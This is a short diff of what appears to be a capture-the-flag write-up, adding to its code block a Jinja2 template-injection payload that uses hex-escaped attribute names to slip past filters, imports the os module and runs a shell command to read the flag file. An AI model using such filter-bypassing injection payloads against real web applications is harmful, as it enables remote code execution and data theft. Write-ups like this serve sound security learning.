@@ -39,7 +39,7 @@ The output
 5. Then I know it can be injected with RCE. So I use this payload to do the injection
 
 ```
-
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
 
 6. Yeay we got the flag!
